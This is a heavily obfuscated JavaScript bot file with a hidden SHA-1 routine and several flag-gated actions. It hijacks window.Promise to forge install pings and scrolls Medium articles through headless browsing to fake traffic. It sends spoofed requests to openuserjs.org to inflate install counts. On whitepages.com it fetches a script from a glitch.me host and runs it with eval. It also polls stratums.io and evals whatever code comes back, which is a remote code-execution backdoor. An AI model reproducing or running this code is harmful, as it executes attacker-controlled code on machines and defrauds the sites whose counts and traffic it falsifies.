                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x1475 + -0x4c9 + -0x1943 * -0x1 | T >>> -0x2 * 0xd + 0x2bf * -0xb + 0x1e6a) + (U ^ V ^ W) + X + (-0x19c204 * 0x1de + -0x526575 + 0x31 * 0x34017ee) + Y[R] << 0x11d * 0x5 + -0x4 * 0x21e + 0x2e7) << 0x1c4e + -0x1a3a + -0x20f | X >>> 0x9cd + 0x1 * -0x177d + 0xdcb) + (T ^ (U = U << 0x7 * 0x21d + -0x754 + -0x759 | U >>> -0x6 * 0x23b + -0x1 * 0x1a89 + 0x27ed) ^ V) + W + (-0x1 * 0x57b6970d + 0x91a731df * -0x1 + 0x15837b48d) + Y[R + (-0xc21 + 0x4 * 0x166 + 0x5d * 0x12)] << 0x18 * -0x13d + 0x11c6 + -0x5f9 * -0x2) << -0xe9 * 0x6 + 0x19b4 + 0x1f * -0xa7 | W >>> -0x263b * 0x1 + -0x8e0 + 0x2f36) + (X ^ (T = T << -0xc * 0xa9 + 0xacf * -0x3 + 0x2877 | T >>> 0x4e8 + -0x265a + 0x85d * 0x4) ^ U) + V + (0x4ea68bc2 + 0x2ad4 * 0x160c9 + -0x3 * 0x8f09587) + Y[R + (0x2d6 * 0xd + -0xab * -0x39 + -0x4aef * 0x1)] << 0x3b * 0x4 + -0x1 * 0x2543 + 0x2457) << 0x886 * -0x2 + -0x1deb + 0x2efc | V >>> -0xf88 + 0x92 * 0x38 + -0x104d) + (W ^ (X = X << -0x942 * 0x3 + -0x7 * 0x36 + -0x2a * -0xb3 | X >>> -0x23b1 + 0x171b + 0x64c * 0x2) ^ T) + U + (0x2 * -0x54934ec2 + -0x9b4d5 * -0x580 + 0x2b * 0x545296f) + Y[R + (-0x16d5 + 0x18c5 + -0x1ed)] << 0x1aee + 0x1922 + -0x3410) << -0x24dd + -0x2e * 0xa5 + -0x851 * -0x8 | U >>> 0xd4 * 0x8 + -0x1a * -0x11b + -0xb1 * 0x33) + (V ^ (W = W << 0x1827 + -0x1 * 0x1f7 + -0x19 * 0xe2 | W >>> 0x1cd2 + -0x633 + -0x169d) ^ X) + T + (0x4ab3 * -0x7633 + 0x4e101db2 + -0xb368844 * -0x6) + Y[R + (-0x1d32 + -0x12f * -0x1 + 0x1c07 * 0x1)] << -0x241b + 0x11a * 0x11 + 0x1161, V = V << -0x193 * -0xf + -0x1079 + 0x3a * -0x1f | V >>> 0x1789 * 0x1 + 0xc2e * 0x3 + -0x3c11;
                    for (; R < -0x20eb + 0x91 + -0x2096 * -0x1; R += 0xc12 + 0x1885 + 0x3e * -0x97)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x20db + 0x4 * 0x136 + 0x27 * 0xb8 | T >>> -0x1 * 0x212e + 0x1 * -0xf1f + -0x2 * -0x1834) + (U & V | U & W | V & W) + X - (-0x28479c1e * -0x2 + 0xd149609 + 0x134074df) + Y[R] << -0x3c3 * -0x7 + 0x2 * -0xaa6 + -0x509 * 0x1) << 0x5 * -0x7b + 0x74 * 0x22 + 0x3 * -0x454 | X >>> 0x25e5 + -0x4 * -0x123 + -0x2a56) + (T & (U = U << -0x1d9a + 0x174e + 0x66a | U >>> -0x1675 + 0x13b1 + 0xa * 0x47) | T & V | U & V) + W - (0x50a22390 + -0x20 * 0x3d6b062 + -0x1 * -0x9b182bd4) + Y[R + (0x8 * 0x260 + -0x1f10 + 0xc11)] << -0x3c3 + -0x6 * 0x3 + 0x3d5) << 0xc7 + -0x22a4 * 0x1 + 0x21e2 | W >>> -0x19 * 0xec + 0xdb * -0x11 + 0x3c5 * 0xa) + (X & (T = T << 0x229a + -0x662 + 0x28e * -0xb | T >>> 0x1 * -0x1974 + 0x9c + 0x18da) | X & U | T & U) + V - (0x5e62a188 + 0xd48f1 * 0x191 + 0x9fe5f * -0x3b) + Y[R + (0x1907 + 0x1081 + -0x2986 * 0x1)] << 0x1d05 + 0x1197 + -0x2e9c) << 0x1b98 * -0x1 + -0xc * -0x33f + -0xb57 | V >>> 0x3 * 0x265 + 0x2630 + 0x4 * -0xb51) + (W & (X = X << -0x3 * 0xed + -0x15 * -0x175 + 0x1 * -0x1bb4 | X >>> -0x1 * -0x121f + -0x25 * -0x11 + -0x1492) | W & T | X & T) + U - (0x83 * -0xdd3675 + 0x60406 * -0x100d + 0x142a5b551 * 0x1) + Y[R + (0x18bc + -0x389 * 0x1 + -0x1530)] << -0x935 + 0x818 + 0x5f * 0x3) << 0x189 * -0x13 + 0x11 * 0xce + -0x31a * -0x5 | U >>> 0x1 * 0x3c1 + -0x1 * -0xd8b + -0xa3 * 0x1b) + (V & (W = W << -0xed * -0xb + -0x534 + -0x4dd | W >>> -0x2178 + 0x172 + 0x2008) | V & X | W & X) + T - (-0x914ecf7f * 0x1 + -0x9 * -0x18e2f7bf + 0x970a6e * 0x3a) + Y[R + (-0x133 * -0x2 + 0x54 + -0x2b6)] << -0xb * -0x24 + -0x535 + 0x3a9, V = V << 0xf1 * 0x5 + -0x8 * 0x1b7 + 0x921 | V >>> 0x10d * 0xd + 0x2210 + -0x2fb7;
                    for (; R < -0x1 * 0x84b + -0x448 + 0xce3; R += 0x2 * 0x1a6 + 0x155c + -0x7 * 0x385)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x16cf * 0x1 + 0x7ea + -0x1eb4 | T >>> -0xc1 * -0x23 + 0x31 * -0x9d + 0xc1 * 0x5) + (U ^ V ^ W) + X - (-0xca9 * 0x1e1d2 + -0x53 * 0x148d04d + 0xb80cb2c3) + Y[R] << 0x28d * 0x2 + -0xb * 0x358 + 0x1fae * 0x1) << 0xbc * -0x26 + 0xddc * -0x2 + -0x4d * -0xb9 | X >>> 0x26f0 + -0x271 * 0xb + -0x6 * 0x1ff) + (T ^ (U = U << -0xe34 + -0x7a * 0x7 + -0x388 * -0x5 | U >>> -0x1cf * -0x13 + -0x1 * 0x225a + -0x1) ^ V) + W - (-0x6fcd353 * 0xf + 0x1e1d8258 + 0x80501daf) + Y[R + (0x24df + 0xe06 + -0x32e4)] << -0x1f88 + -0x2f * -0x3 + -0x1efb * -0x1) << -0x2543 * 0x1 + 0x230e + 0xa * 0x39 | W >>> 0xace + 0x81 * -0x8 + -0x6ab) + (X ^ (T = T << 0x1 * -0xbce + -0x1386 + 0x1f72 | T >>> 0x6 * 0xe9 + -0x19a3 + 0x142f) ^ U) + V - (0x2a8ea883 + -0x40a3db1f + 0x4bb270c6) + Y[R + (-0x669 + 0x10ff * -0x2 + 0x2869)] << -0x9e * -0x1d + -0x22 * 0x113 + 0x12a * 0x10) << 0x2b4 * -0x2 + -0x8 + -0x575 * -0x1 | V >>> -0x11e8 + 0x1237 * -0x1 + 0x121d * 0x2) + (W ^ (X = X << -0xa1c + 0x4 * 0xf7 + 0x65e | X >>> 0x2332 + -0x2182 + -0x1ae) ^ T) + U - (-0x40afab10 + -0xe57 * 0x502b3 + 0xbe269e0f) + Y[R + (-0x1e28 + 0x2580 + -0x1 * 0x755)] << -0x3 * -0x92b + 0x2 * 0xc79 + -0x1cf * 0x1d) << -0x1 * -0x1807 + -0x1f * 0x30 + -0x1232 * 0x1 | U >>> -0x3 * -0x57 + -0xa * -0x153 + -0xe28) + (V ^ (W = W << 0xaa1 + 0x37c * 0x1 + -0xdff | W >>> -0x33 * 0x5f + 0x1102 + 0x11 * 0x1d) ^ X) + T - (-0xdb1e838 + -0x2 * -0x172e9c2f + -0x4 * -0x53c7b81) + Y[R + (0x465 * 0x4 + -0x3d * 0xa3 + 0x1547)] << 0x1327 + -0xa3d + -0x8ea, V = V << -0x1f59 + 0x2120 + -0x1a9 * 0x1 | V >>> -0x223a + 0x7ea * 0x2 + 0x2 * 0x934;
                    this['h0'] = this['h0'] + T << -0x1d2a + -0xf4 + -0xf0f * -0x2, this['h1'] = this['h1'] + U << 0x1 * 0x28f + -0xc5b * 0x1 + 0x1 * 0x9cc, this['h2'] = this['h2'] + V << 0x34d * -0x2 + -0x7ef * -0x1 + -0x155, this['h3'] = this['h3'] + W << 0x123e + 0x2461 + -0x369f, this['h4'] = this['h4'] + X << 0x6b9 * 0x2 + 0x2305 + -0x13 * 0x28d;
                  }
                  ['hex']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return E[R >> -0x2 * 0x55d + -0x22c2 + 0x2d98 & -0x2548 + 0xc79 * -0x2 + -0xc75 * -0x5] + E[R >> -0xd34 + -0x18f + 0xedb & -0x26a7 + 0x2365 + 0x351] + E[R >> 0x217b + 0x1287 + -0x121 * 0x2e & -0x5ab * 0x2 + -0x6e2 * 0x1 + 0x1 * 0x1247] + E[R >> 0x2059 + -0x1c * 0x14d + 0x161 * 0x3 & -0xac9 * 0x2 + -0x1 * 0x1bae + 0x314f] + E[R >> 0x11f3 * 0x1 + -0x4 * 0x29 + -0x1143 & 0x13f3 * 0x1 + -0x4 * 0x31f + -0x18 * 0x4f] + E[R >> 0x1f45 * -0x1 + -0x1 * 0x12d7 + 0x1 * 0x3224 & -0x256 * -0xb + 0x1 * -0x11c1 + -0x7e2] + E[R >> 0x2201 + -0x1a4b + -0x7b2 & -0x53 * -0x1f + -0x56a + -0x2 * 0x24a] + E[-0x3fa * 0x2 + 0x1fd1 + -0x17ce & R] + E[S >> -0x20e0 + -0x2a * 0x23 + 0x135d * 0x2 & 0x17d3 + 0x1238 + -0xa7f * 0x4] + E[S >> 0x17ff * 0x1 + 0x1 * -0x20f + -0x15d8 & 0x1d0d * -0x1 + 0x256e + -0x852] + E[S >> 0x251c + 0x83a + -0x2d42 & 0x5fd + -0x2116 + 0x1b28] + E[S >> -0x1714 + 0x634 * -0x5 + -0x3628 * -0x1 & 0x1c19 + 0x266e + 0x6 * -0xb14] + E[S >> -0x17cd + -0x10a7 + -0x1 * -0x2880 & -0x15ca + -0xc2 * -0x19 + 0x2e7] + E[S >> -0x2662 + 0x14e * 0x7 + 0x4 * 0x752 & 0xa57 * -0x2 + -0x2596 + -0xed * -0x3f] + E[S >> 0x1155 + 0x23ad * 0x1 + -0x34fe & 0x526 * -0x2 + -0x1 * -0x25b1 + 0x2 * -0xdab] + E[-0x123e * -0x1 + 0xf0e * -0x2 + 0xbed & S] + E[T >> -0x2417 + -0x618 + 0x2a4b & 0x69e * 0x4 + -0x1 * -0x506 + -0x1f6f] + E[T >> 0x469 * -0x5 + -0x93c + 0x1f61 & 0x14a2 + -0x43e + -0x1055] + E[T >> 0x7 * -0x41b + -0x9 * 0x2b3 + -0x2c * -0x135 & -0x1c8a + 0x1 * 0x5a6 + -0x497 * -0x5] + E[T >> -0x1e3 * -0xd + -0x18a * -0x11 + -0x32a1 & 0x6c3 * -0x1 + 0x1caf + -0x1d * 0xc1] + E[T >> 0x10bc + 0x6fb * 0x1 + -0x17ab & -0x6 * 0x191 + 0x1 * -0x11c1 + 0x1b36] + E[T >> 0xa31 * 0x1 + -0x260a + 0x1be1 & 0x1dcd + -0x198c * 0x1 + -0x1 * 0x432] + E[T >> -0x19c1 + -0x9d6 + -0x239b * -0x1 & 0xe * 0xc7 + 0xa5c + -0x152f] + E[-0x68 * 0x2d + 0x22c1 + -0x106a & T] + E[U >> 0x7 * -0x112 + -0x10a + 0x8a4 & -0x521 * 0x5 + 0xb * 0x2ac + 0x1d8 * -0x2] + E[U >> -0x2347 + -0xb * 0x27e + 0x3ec9 & -0x266f + -0x4 * 0xa2 + 0x2 * 0x1483] + E[U >> 0x1c76 + -0x139 * 0x17 + -0x43 & 0x1 * 0x70e + 0x1a2d + -0x212c] + E[U >> 0x1 * 0xf9f + 0x16 * 0x130 + -0xde5 * 0x3 & -0x1967 + 0x22c * 0x6 + 0x1 * 0xc6e] + E[U >> -0x72a + -0x8f8 + 0x102e & 0x25ec + 0x196b + -0x28 * 0x195] + E[U >> -0x1428 + 0x8 * -0xd3 + 0x1ac8 & -0x1cb2 * -0x1 + 0x200b + 0x143a * -0x3] + E[U >> -0x3 * 0x31d + 0x1da0 + -0x1445 & -0x186e + 0x1548 + 0x335] + E[0x4af * 0x1 + -0xe3 * -0x1 + -0x583 & U] + E[V >> -0x11a6 + 0xb2f + -0x63 * -0x11 & -0x1824 + -0x4a * 0x59 + 0x31ed] + E[V >> -0x1 * 0xb02 + -0x1470 + 0x1f8a & -0x2 * 0x9a3 + -0x1d77 + 0x30cc] + E[V >> 0x4 * -0x5db + 0x1c42 + -0x57 * 0xe & 0x851 * -0x3 + 0x1754 + -0xa * -0x2b] + E[V >> -0xbe * -0x19 + 0x2536 + -0x37b4 & 0x59 + -0x1fa2 * 0x1 + 0x1f58] + E[V >> 0x3 * -0xb32 + 0x13bb + 0xde7 & 0x1261 + -0x2 * 0xd9d + 0x8e8] + E[V >> -0x13da + 0x1 * 0x1ba7 + -0x7c5 & 0x1 * -0x1181 + -0xd * 0x223 + 0x2d57] + E[V >> 0x69 * 0x23 + -0x843 + 0x2 * -0x30a & -0x223f + -0x7a7 + -0x29f5 * -0x1] + E[-0x8fe + -0x1f94 + -0xd8b * -0x3 & V];
                  }
                  ['digest']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return [
                      R >> -0x1bd8 + 0x2295 + -0xf3 * 0x7 & 0x6d * -0x1f + 0xc2 * -0x27 + -0xe * -0x320,
                      R >> -0x1c30 + -0x2 * 0x6f5 + 0x2a2a & -0x9aa * 0x1 + 0x11 * -0x20f + 0x2da8,
                      R >> 0x1fde + 0x1c29 + -0x1 * 0x3bff & -0x1b25 + -0x1 * -0x142d + 0x7f7,
                      0x1c6d + 0x26e * 0xe + -0x3d72 & R,
                      S >> 0x144 + 0x1f * 0x11e + 0x23ce * -0x1 & -0x6bd * -0x3 + -0x10e1 + -0x257,
                      S >> 0x8a + -0x97 * -0x1 + -0x111 & -0x45d * 0x4 + 0x1 * 0x23f3 + -0x4 * 0x460,
                      S >> -0x1bd1 + 0x2f9 * -0xa + -0x3993 * -0x1 & -0x1c16 * 0x1 + 0x3 * -0xa84 + -0x3ca1 * -0x1,
                      0x2c8 * 0xa + 0xee2 + 0x1 * -0x29b3 & S,
                      T >> 0x84e + -0x515 + -0x3 * 0x10b & -0x66e + -0x5c7 + 0xd34,
                      T >> -0x4 * -0x969 + -0x1 * -0xfaa + -0x553 * 0xa & 0x52 * 0x71 + 0xa9d * -0x1 + 0x6 * -0x419,
                      T >> -0x4fa + 0x5 * 0x43a + -0x1020 & 0x11ad + 0x50b + -0x15b9,
                      -0x7 * 0x15 + -0x25 * -0x97 + -0x1441 & T,
                      U >> -0xd * -0x25 + -0x12df + 0x6 * 0x2d9 & -0x13f5 + 0x349 + 0x11ab,
                      U >> 0x1324 + -0x145b + 0x147 & -0xd * -0x169 + 0x15d + -0x1 * 0x12b3,
                      U >> -0x5b3 * -0x3 + -0x2e5 + -0xe2c * 0x1 & -0x222a * -0x1 + -0x241f + -0xc * -0x3f,
                      0x16d3 + -0x64d * -0x3 + -0x28bb & U,
                      V >> 0x323 + -0x235 + -0xd6 * 0x1 & -0x21ed + 0x12a * -0x1 + -0x120b * -0x2,
                      V >> -0x2254 + -0x205d + 0x42c1 & -0x1bb * 0x3 + -0x8df + -0xf * -0x101,
                      V >> 0x1cdb + -0x17a7 + 0x14b * -0x4 & -0x1852 + 0x2c * -0x5c + 0x2921 * 0x1,
                      -0x3a6 * 0x1 + 0x1997 + -0x14f2 & V
                    ];
                  }
                  ['arrayBuffe' + 'r']() {
                    var R, S;
                    return this['finalize'](), R = new ArrayBuffer(0x17 * 0x19d + -0xac0 + 0x1f * -0xd9), (S = new DataView(R))['setUint32'](-0x3 * -0xa47 + -0x1 * -0x11da + -0x30af, this['h0']), S['setUint32'](0x3 * 0x33b + -0x2b8 + -0x6f5, this['h1']), S['setUint32'](0x13e + -0x2418 + -0x5f * -0x5e, this['h2']), S['setUint32'](-0x7b + -0x2015 + 0x209c, this['h3']), S['setUint32'](0x3b7 + 0x1a61 + 0xf8 * -0x1f, this['h4']), R;
                  }
              }
              O['prototype']['toString'] = O['prototype']['hex'], O['prototype']['array'] = O['prototype']['digest'];
              const P = K();
              window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
              let Q = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x3 * 0x7f7 + -0x938 * 0x1 + 0x211d];
              return window['Promise'] = class extends window['Promise'] {
                constructor(...R) {
                  let S = -0x246b + -0x2065 * 0x1 + 0x44d0;
                  R[-0x542 + 0x1 * -0xa4e + 0xf90]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (R[-0xaaf + -0x1 * 0x1285 + 0x1d34] = T => {
                    let U = Q['getAttribu' + 'te']('data-ping-' + 'url');
                    if (U) {
                      let V = P(Q['getAttribu' + 'te']('data-ip-ad' + 'dress') + Q['getAttribu' + 'te']('data-scrip' + 't-id') + Q['getAttribu' + 'te']('data-ping-' + 'key')),
                        W = new XMLHttpRequest();
                      W['open']('POST', U + ('&mo=3&ping' + '_key=') + encodeURIComponent(V), 0x14b * 0x3 + 0x1 * -0x12e7 + 0x1 * 0xf07), W['overrideMi' + 'meType']('text/plain'), W['onload'] = () => {}, W['send'](), S = 0x1a2d + 0xfaa * 0x1 + 0xaa * -0x3f;
                    }
                  }), S || super(...R);
                }
              }, window['setTimeout'](() => {
                Q['click']();
              }, 0x3 * -0x358 + 0x4eb * -0x7 + 0x493 * 0xb), Promise['resolve'](0x2149 * 0x1 + 0x1bd2 + -0x4f * 0xc6);
            }), await wait(NETWORK_PATIENCE), await B[a5(0xe)](), await A['close'](), r()));
          }
        }
        for (let s = 0x6 * 0x177 + 0x6b * -0x3 + -0x789; s < -0x211 * -0x5 + 0x65 * -0x15 + -0x20b; s++)
          r();
      }, -0x6f6 + 0x2 * -0xcd5 + -0x1082 * -0x2), flags['RPL2_MDM2'] && setTimeout(async () => {
        const r = await n['newPage']();
        for (;;) {
          let s = 0x178a + 0x12 * -0x89 + -0x8 * 0x1bd;
          if (await r['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](u => s++), !s) {
            await randomWait();
            for (let u = 0x1901 * 0x1 + 0x1 * -0x163b + -0x47 * 0xa; u < getRandomInt(-0xacd * -0x1 + -0x23b * 0x2 + 0x1 * -0x656, 0x1 * -0x1511 + -0x1 * 0x15c5 + 0x2adb); u++)
              await r['keyboard']['press']('ArrowDown'), await randomWait();
            await randomWait(), await wait(0x1831b + 0x1 * -0x4ed5 + -0xc51 * 0x6);
          }
        }
      }, 0x3 * -0x331 + 0xb29 * 0x2 + -0xc5b), flags['RPL2_WP'] && setTimeout(async () => {
        (async function r() {
          try {
            let s = -0x2180 + -0x14 * -0x31 + -0x4f2 * -0x6;
            const t = await n['newPage']();
            if (await t['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](u => s++), s)
              return await t['close'](), r();
            await wait(0x1 * -0x599 + 0x6fd * -0x2 + 0x1f4b), await t['evaluate'](() => {
              let u = new XMLHttpRequest();
              u['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1 * 0x1bcd + 0x2a1 * 0xa + 0x183), u['send'](), eval(u['responseTe' + 'xt']);
            });
          } catch (u) {}
        }());
      }, -0x1e89 * -0x1 + 0x5 * -0x383 + -0x9 * 0x166);
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](0x1f + 0x1 * 0xc7f + -0xca * 0xf), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || -0x3 * -0x8df + -0x3088 + -0x1 * -0x357b);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const a6 = b,
          h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = 0x7 * 0x419 + -0x1 * -0x398 + -0x2046) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xdf * -0x1d + 0xf0d * 0x2 + -0x1 * 0x375c));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](-0x13fa + -0x39e * 0x7 + -0x2d4c * -0x1, A['indexOf']('\x20'));
            return y ? B['slice'](-0x1 * -0x12a3 + -0x176c + 0xaf * 0x7, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](-0x42d6 + -0xc7e + 0x7664 * 0x1),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](0x3c0c * 0x1 + -0x2021 + 0x13d * 0x9),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + a6(0x3, 'VbVH') + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = -0x2199 + 0x134a + 0xe4f; h < -0x830 + 0x2111 * -0x1 + 0x2945; h++)
        setTimeout(f, (0x16847 + -0xefc * 0xb + 0x26ed) * h * getRandomInt(0x240e + 0x204b + -0x4458, -0x3a * -0x40 + -0x6a3 + -0x7da));
      setInterval(() => {
        f();
        for (let i = 0x94a * 0x1 + 0x3 * 0x382 + -0x13d * 0x10; i < -0xffb * -0x1 + -0xec * -0x28 + -0x34d7; i++)
          setTimeout(f, (0x5cad * 0x5 + -0x391a * -0x5 + -0x20283) * i * getRandomInt(0x1a53 + -0x1e54 * -0x1 + 0x1c53 * -0x2, 0x1fa + 0x5a * -0x4b + 0x1867 * 0x1));
      }, 0x263510 + -0x4b * -0x1477d + 0x4f382f * -0x1);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        try {
          axios['post']('https://st' + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, -0x361e + 0x7ab * 0x3 + 0x3 * 0x190ff);
    }
  ]
];
for (let e of actions)
  e[0x18b9 + -0x1747 + -0x172]() && setTimeout(e[-0x19e + -0x45 * -0x12 + 0x33b * -0x1]);

function a() {
  const aV = [
    'amoteuu2lt19At8',
    'gCkLWPVdPXD3n8klW7Tc',
    'rg/en/scri',
    'WQqfCSoDzJ7dQdS6W74',
    'WPiywCkgl8o4W5q6WOmo',
    'start',
    'easyfork.o',
    'ChrZl2j5lxnPDa',
    'e/mope.io',
    'C2vYlwfKyMXVyW',
    'AgfZ',
    'mMjKzgu5odDIma',
    'zw1PEc1WCM9Klq',
    'nIbfzgCVmta4lG',
    'y2XVC2u',
    'om/sadfros',
    'x8/knots?s',
    'Ad_Link_By',
    'W6ZdNciEW7P9W7jkWO3dKW',
    'WQpdPc5/WRFdRmkfFIbk'
  ];
  a = function() {
    return aV;
  };
  return a();
}